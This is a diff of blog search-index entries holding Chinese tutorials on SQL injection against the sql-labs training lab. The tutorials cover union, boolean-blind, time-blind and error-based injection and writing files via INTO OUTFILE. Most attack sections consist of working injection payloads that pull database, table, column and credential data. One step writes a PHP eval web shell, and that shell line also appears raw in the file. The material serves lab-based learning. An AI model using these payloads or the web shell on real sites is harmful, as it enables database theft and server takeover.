+<p>发现了没有,我们将数据库的名字改为了16进制的编码,因为要避免使用’数据库名’这样的单引号被过滤.比较好的方法就是将其改为16进制.</p>
+<p>小知识:</p>
+<p>在MySQL中,使用0x后面跟16进制数,就可以将编码转换为字符串.</p>
+<p>爆字段:<code> ?id=-1%df&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273)--+</code></p>
+<p>用一样的方法,将表名换成0x16进制数</p>
+<p>爆记录:<code> ?id=-1%df&#39; union select 1,2,(select group_concat(flag) from 6EfPxZRk)--+</code></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入(布尔盲注)</title>
+    <url>/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/</url>
+    <content><![CDATA[<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>之前以sql-labs第五关作为例子写过一个布尔盲注的,结果这个markdown一次更新直接搞没了,并且我还没来得及上传到自己的blog中…只好重新再写一次,用第八关作为例子.</p>
+<h4 id="小扩展"><a href="#小扩展" class="headerlink" title="小扩展"></a>小扩展</h4><blockquote>
+<p>盲注又分为Boolean盲注和时间型盲注，本关要讲的是Boolean盲注。<br>Boolean盲注是基于真假的判断，它有几种判断方式：<br>通过长度判断：length()：length(database())&gt;=x<br>通过字符判断：substr():substr(database(),1,1)=’s’<br>通过ascll码判断：ascii():ascii(substr(database(),1,1))=x</p>
+</blockquote>
+<h3 id="1-找注入点"><a href="#1-找注入点" class="headerlink" title="1.找注入点"></a>1.找注入点</h3><p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/934347d10eee8533c75e37f5d88159d6.png" alt="截图"></p>
+<p>单引号测试报错</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/e5e9cd88eefe229e3aa4af300528202d.png" alt="截图"></p>
+<p>双引号没报错,可以确定sql查询中没有使用双引号,因为双引号被当作字符处理了</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/a0d89a183f395569f824a448668c9d5b.png" alt="截图"></p>
+<p>可以确定sql语句为<code>select * from table where id = ((&#39;input&#39;)) limit 0,1 </code></p>
+<h3 id="2-爆数据库名"><a href="#2-爆数据库名" class="headerlink" title="2.爆数据库名"></a>2.爆数据库名</h3><p>payload:<code> ?id=1&#39; and substr(database(),1,1)=&#39;s&#39; --+</code></p>
+<p>substr()函数在这里的意思是从当前数据库的名字(database())中从第一个开始提取1个字符,来判断是否是后面要匹配的字符</p>
+<p>因为我们一个一个试太慢了,于是我们使用burp来减少我们的工作量.</p>
+<p>不会使用burp可以看看我之前的博客,或者网上也有很多很好的资料</p>
+<p><u>先抓包,发送到intercept</u></p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/478c8ab985caae3a33cf172d941d2a54.png" alt="截图"></p>
+<p><u>将攻击类型改为Cluster bomb</u></p>
+<p><u>再将选取的位置和要判断的字符选定为变量</u></p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/f17aac46c023b929754d26786cd68dc4.png" alt="截图"></p>
+<p><u>第一个变量设置为0-9,因为我们取的是0-9位</u></p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/0833e7bf748ebcd9d70ae420b7de31cc.png" alt="截图"></p>
+<p><u>第二个变量设置为a-z,因为我们判断的字符肯定在这个范围里</u></p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/2f9c8b68d0ed53cec1bced7fa2f99971.png" alt="截图"></p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/2dbc1ea7c5419c4850d45c93c1b532b9.png" alt="截图"></p>
+<p>ok,这样我们就得到了当前数据库的名字,security</p>
+<h3 id="2-爆破表名"><a href="#2-爆破表名" class="headerlink" title="2.爆破表名"></a>2.爆破表名</h3><p>payload:<code> ?id=1&#39; and substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1)=&#39;s&#39; --+</code></p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/2d3cc87aafe3d1cd6b5d85042e9bccee.png" alt="截图"></p>
+<p>这次要设置三个变量,第一个limit 0,1的意思是,从这个数据库中从第0张开始取1张表.所以我们要将这个0设为变量,因为我们要选取所有的表</p>
+<p>后面两个和前面的一致.</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/ce4f158458015c416b1043e40aa9f47a.png" alt="截图"></p>
+<p>可以利用升序排序使得数据更加直观,我们可以看到0-4一共5张表,我们选择第五张users表</p>
+<h3 id="3-爆字段"><a href="#3-爆字段" class="headerlink" title="3.爆字段"></a>3.爆字段</h3><p>payload:<code> ?id=1&#39; and substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),1,1)=&#39;s&#39; --+</code></p>
+<p>设置变量和上面一样</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/3f550ba93c8363f421ef7985aa1bec11.png" alt="截图"></p>
+<p>得到id,username,password三个字段</p>
+<h3 id="4-爆记录"><a href="#4-爆记录" class="headerlink" title="4.爆记录"></a>4.爆记录</h3><p>payload:<code> ?id=1&#39; and substr((select username from users limit 0,1),1,1)=&#39;d&#39; --+</code></p>
+<p><code>?id=1&#39; and substr((select password from users limit 0,1),1,1)=&#39;d&#39; --+ </code></p>
+<p>操作和之前一样</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/dfbdcd9498cbe5548d5d0cf6f1b7ab89.png" alt="截图"></p>
+<p>这个是得到username</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/bfa283c8ddd2c035022eaab436d130f6.png" alt="截图"></p>
+<p>得到password</p>
+<h4 id="特别注意"><a href="#特别注意" class="headerlink" title="特别注意"></a>特别注意</h4><p><strong>mysql对大小写不敏感，所以你不知道是Dumb 还是dumb</strong></p>
+<p>另外,大家想实践动手又懒得搭建本地平台,可以选择PwnTheBox平台</p>
+<p><a href="https://www.pwnthebox.com/challenges/1/easy/type/7?id=215">https://www.pwnthebox.com/challenges/1/easy/type/7?id=215</a></p>
+<p>BUUCTF中虽然也有,但是无法使用burp进行注入,很花时间.</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入(报错盲注)</title>
+    <url>/2022/01/12/SQL%E6%B3%A8%E5%85%A5(%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8)/</url>
+    <content><![CDATA[<h1 id="基于报错的SQL盲注"><a href="#基于报错的SQL盲注" class="headerlink" title="基于报错的SQL盲注"></a>基于报错的SQL盲注</h1><p>报错型盲注</p>
+<blockquote>
+<p>众所周知，盲注并不会返回错误信息，使得sql注入的难度提高。而报错型注入则是利用了MySQL的第8652号bug ：Bug #8652 group by part of rand() returns duplicate key error来进行的盲注，使得MySQL由于函数的特性返回错误信息，进而我们可以显示我们想要的信息，从而达到注入的效果；当然其他类型的数据库也存在相应的问题，在此我们不提。</p>
+</blockquote>
+<p>小扩展:</p>
+<p><strong>floor():向下取整(去尾)</strong></p>
+<p><strong>group by a:循环读取每一行a的记录</strong></p>
+<p><strong>rand():随机生成0-1的值,取不到1.</strong></p>
+<blockquote>
+<p>报错注入主要利用的group by的机制，下面先来了解一下原理：</p>
+<p>group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。group by floor(random(0)2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时 floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值不一致，导致插入时与原本已存在的产生冲突的错误。</p>
+</blockquote>
+<p>前面的内容无非就是判断列数,判断注入点</p>
+<h3 id="1-爆数据库名"><a href="#1-爆数据库名" class="headerlink" title="1.爆数据库名"></a>1.爆数据库名</h3><p><code>?id=1&#39; and (select 1 from (select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))name from information_schema.tables group by name)b) --+</code></p>
+<h3 id="2-爆数据表"><a href="#2-爆数据表" class="headerlink" title="2.爆数据表"></a>2.爆数据表</h3><p><code>?id=1&#39; and (select 1 from (select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,0x3a,floor(rand()*2))name from information_schema.tables group by name)b) --+</code></p>
+<p>limit 0,1中的0指的是第一张表,可以更改这位数进行爆破不同表名</p>
+<h3 id="3-爆字段"><a href="#3-爆字段" class="headerlink" title="3.爆字段"></a>3.爆字段</h3><p><code>?id=1&#39; and (select 1 from (select count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),0x3a,0x3a,floor(rand()*2))name from information_schema.tables group by name)b) --+</code></p>
+<h3 id="4-爆记录"><a href="#4-爆记录" class="headerlink" title="4.爆记录"></a>4.爆记录</h3><p><code>?id=1&#39; and (select 1 from (select count(*),concat(0x3a,0x3a,(select username from users limit 2,1),0x3a,0x3a,floor(rand()*2))name from information_schema.tables group by name)b) --+</code></p>
+<h2 id="扩展知识"><a href="#扩展知识" class="headerlink" title="扩展知识"></a>扩展知识</h2><p>这个报错注入是有一定几率成功的,因为group by函数不允许重复查询2次,在floor(rand())的时候,会生成0或者1,当第一次产生0或者1的时候,会再次rand()生成1次0或者1,若两次相同,就会报错,但也有概率不相同,就不会报错.</p>
+<p>关于这个bug的详细信息可以看看这两位师傅写的blog,写得很详细</p>
+<p><a href="https://blog.csdn.net/qq_35544379/article/details/77453019">https://blog.csdn.net/qq_35544379/article/details/77453019</a></p>
+<p><a href="https://blog.csdn.net/weixin_43249758/article/details/104168777">https://blog.csdn.net/weixin_43249758/article/details/104168777</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入(布尔盲注和时间盲注进阶版)</title>
+    <url>/2022/01/11/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%8F%8A%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E8%BF%9B%E9%98%B6%E7%89%88)/</url>
+    <content><![CDATA[<h1 id="布尔盲注和时间盲注的一些改进"><a href="#布尔盲注和时间盲注的一些改进" class="headerlink" title="布尔盲注和时间盲注的一些改进"></a>布尔盲注和时间盲注的一些改进</h1><p>在之前提到的基于GET方法的两种盲注在面对sql-labs靶场时还是好用的,但是在实战中或者其他题目的时候就会有一丝缺陷,就是用burp爆破出的数据是不分大小写的,于是下面利用acsii码来约束大小写</p>
+<p>布尔盲注payload:</p>
+<pre><code>?id=1&#39; and ascii(substr(database(),1,1))=65 --+//爆数据库
+?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=65 --+//爆数据表
+?id=1&#39; and ascii(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1),1,1))=65 --+//爆字段
+?id=1&#39; and ascii(substr((select username from users limit 0,1),1,1))=65 --+ //爆记录
+</code></pre>
+<p>时间盲注payload:</p>
+<pre><code> ?id=1&#39; and if(ascii(substr(database(),1,1))=65,sleep(5),1) --+//爆数据库
+ ?id=1&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=65,sleep(5),1) --+//爆表名
+ ?id=1&#39; and if(ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1))=65,sleep(5),1)--+//爆字段
+ ?id=1&#39; and if(ascii(substr((select username from users limit 0,1),1,1))=65,sleep(5),1) --+//爆记录
+</code></pre>
+<p>在我们设置攻击列表的时候就不能单纯的用0-9这种了,因为我们将其都换成了ASCII码了,所以最好再自己创建一个字典,0-9是48-57,a-z是97-122,A-Z是65-90,还有其他一些特殊字符也可以自己加一点,最好是从33-126都有.</p>
+<p>关于如何使用字典攻击前面的博客里面有.</p>
+<p>我用sql-labs less8作为实战演示一下</p>
+<p><img src="/2022/01/11/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%8F%8A%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E8%BF%9B%E9%98%B6%E7%89%88)/8c8910ae8202764f0461b0204009f92c.png" alt="截图"></p>
+<p>设置变量</p>
+<p><img src="/2022/01/11/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%8F%8A%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E8%BF%9B%E9%98%B6%E7%89%88)/5cec828f504dbf60069107fc9db11204.png" alt="截图"></p>
+<p>导入字典</p>
+<p><img src="/2022/01/11/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%8F%8A%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E8%BF%9B%E9%98%B6%E7%89%88)/6534901013cdb07dbf423f57f242eabe.png" alt="截图"></p>
+<p>按顺序解码</p>
+<p><img src="/2022/01/11/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%8F%8A%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E8%BF%9B%E9%98%B6%E7%89%88)/be32a622e336ad9f325755fca2bad830.png" alt="截图"></p>
+<p>得到数据库的名字</p>
+<p><img src="/2022/01/11/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%8F%8A%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E8%BF%9B%E9%98%B6%E7%89%88)/7d215d53299d01d24e46959ca69dff8a.png" alt="截图"></p>
+<p><img src="/2022/01/11/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%8F%8A%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E8%BF%9B%E9%98%B6%E7%89%88)/9fa172e69c4d2d3ed6cdff2d2c1a75fe.png" alt="截图"></p>
+<p>得到表的名称</p>
+<p><img src="/2022/01/11/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%8F%8A%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E8%BF%9B%E9%98%B6%E7%89%88)/3ed37665c4d113c5b1132e3470267bd3.png" alt="截图"></p>
+<p>得到列的名称,id,flag</p>
+<p><img src="/2022/01/11/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%8F%8A%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E8%BF%9B%E9%98%B6%E7%89%88)/8e36832a3ff8af8a35ad337a81e675fd.png" alt="截图"></p>
+<p>得到了数据,但是数据很多而且很乱,一个一个弄很麻烦,我们利用xlsx进行排序和转置</p>
+<p><img src="/2022/01/11/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%8F%8A%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E8%BF%9B%E9%98%B6%E7%89%88)/a2afb22b53ba0a7eacb6e0f5aa0bd77c.png" alt="截图"></p>
+<p>再利用记事本替换他们之间的空格位置,再放入编码转换器中</p>
+<p><img src="/2022/01/11/SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E5%8F%8A%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E8%BF%9B%E9%98%B6%E7%89%88)/47f97e5dffbbca2a9d95749ffd0fbad5.png" alt="截图">得到flag.</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入(文件上传注入)</title>
+    <url>/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B3%A8%E5%85%A5)/</url>
+    <content><![CDATA[<h2 id="SQL文件上传注入"><a href="#SQL文件上传注入" class="headerlink" title="SQL文件上传注入"></a>SQL文件上传注入</h2><p>小扩展：</p>
+<blockquote>
+<p>winserver的iis默认路径c:\Inetpub\wwwroot<br>linux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm等<br>apache 就…/var/www/htm，…/var/www/html/htdocs<br>phpstudy 就是…\PhpStudy20180211\PHPTutorial\WWW<br>xammp 就是…\xampp\htdocs<br>load_file()导出文件<br>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。</p>
+</blockquote>
+<p>使用条件：<br>A、必须有权限读取并且文件必须完全可读<br>and (select count(<em>) from mysql.user)&gt;0/</em> 如果结果返回正常,说明具有读写权限。<br>and (select count(<em>) from mysql.user)&gt;0/</em> 返回错误，应该是管理员给数据库帐户降权<br>B、欲读取文件必须在服务器上<br>C、必须指定文件完整的路径<br>D、欲读取文件必须小于max_allowed_packet</p>
+<blockquote>
+<p>@@datadir——数据库存储路径<br>@@basedir——Mysql安装路径<br>dumpfile——导出文件，类似outfile；不同的是，dumpfile一次导出一行，会和limit结合使用<br>load_file()——将文件导入mysql，用法select load_file(“文件路径”)</p>
+</blockquote>
+<p> 下面以sql-labs第七关作为演示</p>
+<h3 id="1-找注入点"><a href="#1-找注入点" class="headerlink" title="1.找注入点"></a>1.找注入点</h3><p>每关都一样,第一步就是找注入点</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B3%A8%E5%85%A5)/788584d83e73430230f5285f232d2b58.png" alt="截图"></p>
+<p>这是我新学到的方法,直接id=’可以快速判断是否有注入点</p>
+<p>这里可以看出存在回显,说明有注入点</p>
+<p>现在判断SQL查询语句</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B3%A8%E5%85%A5)/4cbc7bc3898a2c81d16d12a583727a50.png" alt="截图"></p>
+<p>单引号报错</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B3%A8%E5%85%A5)/7d7a87e1cea3d9da4e29cf4421856729.png" alt="截图"></p>
+<p>双引号不报错,说明肯定不是双引号</p>
+<p>加上括号试试,</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B3%A8%E5%85%A5)/1f11ebdb4ce3e0d14ff8486c1cf77ab8.png" alt="截图"></p>
+<p>页面显示正常，我们知道原有的sql语句为： <code>select * from table where id = ((‘input’)) limit 0,1，其中input</code>为输入内容。</p>
+<h3 id="2-找到网站的绝对路径"><a href="#2-找到网站的绝对路径" class="headerlink" title="2.找到网站的绝对路径"></a>2.找到网站的绝对路径</h3><p><code> ?id=-1&#39; union select 1,2,@@datadir -- #</code></p>
+<p>可以得到mysql数据存储路径</p>
+<p>因为第七关是没有显示信息的,我们就拿第一关作为获取路径的地方</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B3%A8%E5%85%A5)/6d6c4aa1b6d640358622abf614c6563a.png" alt="截图"></p>
+<p>@@datadir返回的是数据库存储数据的路径，而我们知道网站路径是在WWW目录下，那么结合@@datadir我们可以推断出网站的绝对路径。</p>
+<p>这里因为这个靶场不是本地的原因,无法连接上,但是思路是一样的.</p>
+<p>payload:<code> ?id=-1’)) union select 1,2,’&lt;?php @eval($_POST[&quot;shell&quot;]);?&gt;’ into outfile “C:\\inetpub\\target\\sqlilabs\\Less-7\\shell.php” -–+</code></p>
+<?php @eval($_POST["shell"]);?><p>是一句话木马,将其传入后面的文件路径,接着用中国蚁剑连接即可注入成功.</p>
+<p>另外注意,<strong>在写路径的时候最好写\\,不然\会被转义</strong>.</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入(时间盲注)</title>
+    <url>/2022/01/10/SQL%E6%B3%A8%E5%85%A5(%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8)/</url>
+    <content><![CDATA[<h1 id="基于时间进行盲注"><a href="#基于时间进行盲注" class="headerlink" title="基于时间进行盲注"></a>基于时间进行盲注</h1><p>当页面没有报错也没有回显时,时间盲注就成了我们的底牌.因为它的时间成本相对来说是最大的.它是利用页面响应时间来提示我们输入的正确与否.</p>
+<h3 id="1-判断注入点"><a href="#1-判断注入点" class="headerlink" title="1.判断注入点"></a>1.判断注入点</h3><p>这步和以前稍有不同,因为没有回显,要依靠页面响应时间</p>
+<p>先介绍个语法</p>
+<p><code> if(2&gt;1,sleep(5),1)</code>表示如果2&gt;1成立,就执行sleep(5),否则执行1                             </p>
+<p>我们就可以用这个来进行寻注入点</p>
+<p><img src="/2022/01/10/SQL%E6%B3%A8%E5%85%A5(%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8)/006bbe816edf18c0ba830a19593239d7.png" alt="截图"></p>
+<p>如何找注入点前面已经讲过了,这里就不再介绍了,当我输入<code>?id=1&#39; and sleep(5) --+</code>时可以看到</p>
+<p><img src="/2022/01/10/SQL%E6%B3%A8%E5%85%A5(%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8)/82444220d4d168c305720556e852500b.png" alt="截图"></p>
+<p>耗时6.9秒</p>
+<p>当我错误输入时</p>
+<p><img src="/2022/01/10/SQL%E6%B3%A8%E5%85%A5(%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8)/014e4579b520910d03d268343f3fe320.png" alt="截图"></p>
+<p>就几百毫秒,不到一秒钟,因此,页面反应就是我们的判断依据.也证明了该题存在注入点.</p>
+<h3 id="2-爆破数据库"><a href="#2-爆破数据库" class="headerlink" title="2.爆破数据库"></a>2.爆破数据库</h3><p>payload:<code> ?id=1&#39; and if(length(database())=8,sleep(5),1) --+</code></p>
+<p>先利用这个语法判断长度</p>
+<p>payload:<code> ?id=1&#39; and if(substr(database(),1,1)=&#39;q&#39;,sleep(5),1) --+</code></p>
+<p>利用burp来爆破一下(如何使用可以查看之前的布尔盲注博客)</p>
+<p><img src="/2022/01/10/SQL%E6%B3%A8%E5%85%A5(%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8)/e335d55dd669ac4f9e94f90cdbf93454.png" alt="截图"></p>
+<p><img src="/2022/01/10/SQL%E6%B3%A8%E5%85%A5(%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8)/ad514af3a17bbcbcffe1c75e8f9dc6c9.png" alt="截图"></p>
+<p>如果和进行布尔盲注一样使用length进行筛选是没有用的，通过长度没有办法判断出执行成功的数据包。由于sleep(5)所以我们要筛选出响应时间大于5s的数据包才是我们想要的。我们在columns里面勾选Response received和Response completed这两个选项</p>
+<p><img src="/2022/01/10/SQL%E6%B3%A8%E5%85%A5(%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8)/0be9deac71367de9099eee571b2811d1.png" alt="截图"></p>
+<p>有五千多毫秒的及时我们要找的数据,不过他这里显然没出好题目,虽然页面是一样的,但是页面返回的数据长度不一样,我们这里也可以根据length来排序.</p>
+<p>不过既然是时间盲注,我们依然用时间来做.根据上表得出我们的数据库名为security.</p>
+<h3 id="3-爆表名"><a href="#3-爆表名" class="headerlink" title="3.爆表名"></a>3.爆表名</h3><p>payload:<code> ?id=1&#39; and if(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1)=&#39;q&#39;,sleep(5),1) --+</code></p>
+<p><img src="/2022/01/10/SQL%E6%B3%A8%E5%85%A5(%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8)/b2895c69fe682de981fe2b60b434ada7.png" alt="截图"></p>
+<p>得到用户表,一共五个表</p>
+<h3 id="4-爆字段名"><a href="#4-爆字段名" class="headerlink" title="4.爆字段名"></a>4.爆字段名</h3><p>payload:<code> ?id=1&#39; and if(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1)=&#39;q&#39;,sleep(5),1)--+</code></p>
+<p><img src="/2022/01/10/SQL%E6%B3%A8%E5%85%A5(%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8)/c68bd0e7bd676ee5fe4d468db2a2edbd.png" alt="截图"></p>
+<p>可以得到id,username,password三个字段</p>
+<h3 id="5-爆记录"><a href="#5-爆记录" class="headerlink" title="5.爆记录"></a>5.爆记录</h3><p>payload:<code> ?id=1&#39; and if(substr((select username from users limit 0,1),1,1)=&#39;d&#39;,sleep(3),1) --+</code></p>
+<p><img src="/2022/01/10/SQL%E6%B3%A8%E5%85%A5(%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8)/c1ee77c4e6fcdaac5dba1ca71d7149b9.png" alt="截图"></p>
+<p>爆密码的话将username改为password即可.</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入(联合注入)</title>
+    <url>/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/</url>
+    <content><![CDATA[<h1 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h1><p>联合注入的过程(以sql-labs第一关作为例子)</p>
+<p>1、判断注入点</p>
+<p>2、判断是整型还是字符型</p>
+<p>3、判断查询列数<br>4、判断显示位<br>5、获取所有数据库名<br>6、获取数据库所有表名<br>7、获取字段名</p>
+<p>8、获取字段中的数据</p>
+<h3 id="一、判断注入点"><a href="#一、判断注入点" class="headerlink" title="一、判断注入点"></a>一、判断注入点</h3><p>我们在可能存在SQL注入变量的后边添加以下payload：</p>
+<p>and 1=1 / and 1=2 回显页面不同(整形判断) </p>
+<h3 id="二、判断整形还是字符型"><a href="#二、判断整形还是字符型" class="headerlink" title="二、判断整形还是字符型"></a>二、判断整形还是字符型</h3><p>输入 ?id=1 and 1=2 ,返回false即是数字型</p>
+<p>相反就是字符型</p>
+<h3 id="三、判断查询列数"><a href="#三、判断查询列数" class="headerlink" title="三、判断查询列数"></a>三、判断查询列数</h3><p>order by 函数是对MySQL中查询结果按照指定字段名进行排序，除了指定字 段名还可以指定字段的栏位进行排序，第一个查询字段为1，第二个为2，依次 类推。我们可以通过二分法来猜解列数</p>
+<p>payload:</p>
+<p><code> ?id=1&#39; order by (?) --+</code></p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/0aa2d9459d799989bd9cf06db61d06e0.png" alt="截图"></p>
+<p>这里显示不足四列,这里的4指的是4个字段</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/c86ccbf0482cab63d203d58db91458e0.png" alt="截图"></p>
+<p>现在就猜到该数据库共有3个字段了</p>
+<h3 id="四、判断显示位"><a href="#四、判断显示位" class="headerlink" title="四、判断显示位"></a>四、判断显示位</h3><p>payload:<code>?id=-1&#39; union select 1,2,3 --+</code></p>
+<p>先介绍一下union,它的作用是将两个select查询结果合并(<strong>前提条件是类型相同且列数相同</strong>),但显示的时候只能显示第一行</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5)/034a94e82efed793289797d934b18586.png" alt="20180607105947757.png"></p>
+<p>这里虽然显示两行,但展示到页面的时候只有第一行</p>
